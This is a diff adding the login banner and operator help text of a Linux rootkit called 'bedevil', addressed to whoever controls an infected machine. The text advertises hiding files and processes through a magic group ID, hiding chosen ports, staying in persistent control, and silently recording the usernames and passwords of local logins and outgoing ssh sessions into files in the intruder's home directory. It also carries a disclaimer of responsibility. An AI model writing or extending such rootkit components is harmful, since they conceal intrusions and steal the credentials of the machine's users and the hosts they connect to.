@@ -1,0 +1,41 @@
+   ___                    ___                             ___  
+  (   )                  (   )                      .-.  (   ) 
+   | |.-.     .--.     .-.| |    .--.    ___  ___  ( __)  | |  
+   | /   \   /    \   /   \ |   /    \  (   )(   ) (''")  | |  
+   |  .-. | |  .-. ; |  .-. |  |  .-. ;  | |  | |   | |   | |  
+   | |  | | |  | | | | |  | |  |  | | |  | |  | |   | |   | |  
+   | |  | | |  |/  | | |  | |  |  |/  |  | |  | |   | |   | |  
+   | |  | | |  ' _.' | |  | |  |  ' _.'  | |  | |   | |   | |  
+   | '  | | |  .'.-. | '  | |  |  .'.-.  ' '  ; '   | |   | |  
+   ' `-' ;  '  `-' / ' `-'  /  '  `-' /   \ `' /    | |   | |  
+    `.__.    `.__.'   `.__,'    `.__.'     '_.'    (___) (___) 
+                                                             
+                                                             
+  (if reading this in an interactive shell, press q at any point
+   to leave. this will not show again.)
+
+  Warning: I am not responsible whatsoever for your actions. Ever.
+
+  Rootkit information:
+
+    - File & process hiding is managed by a magic GID.
+    - Bedevil will persistently remain in control.
+
+    - Any ports you want to keep hidden should be written
+      to 'hide_ports' in your home directory. This supports
+      port ranges too.
+        (i.e.:) '105' or '103-110'
+      Every new port or port range to be hidden must be on
+      a line of its own.
+
+    - Successful user authentications on this machine are
+      logged to 'auth_logs', with the respective username
+      and password, in your home directory.
+      Outgoing ssh logs are also logged into your home directory,
+      in a file called 'ssh_logs', along with the username used,
+      the host and the password.
+    
+    - Do NOT delete your home directory. There are scripts
+      available at your leisure which live in 'etc/'. Run
+      or read them for more information.
+
